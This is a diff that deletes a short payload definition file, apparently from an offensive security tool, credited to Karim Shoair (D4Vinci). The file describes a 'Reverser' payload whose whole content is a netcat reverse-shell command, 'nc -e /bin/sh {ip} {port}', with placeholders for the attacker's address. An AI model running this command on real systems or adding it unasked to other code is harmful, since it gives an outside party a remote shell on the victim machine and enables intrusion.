@@ -1,7 +1,0 @@
-[Info]
-Author      = Karim shoair (D4Vinci)
-Description = Establish a reverse connection with netcat.
-
-[Payload]
-Type     = Reverser
-Payload  = nc -e /bin/sh {ip} {port}
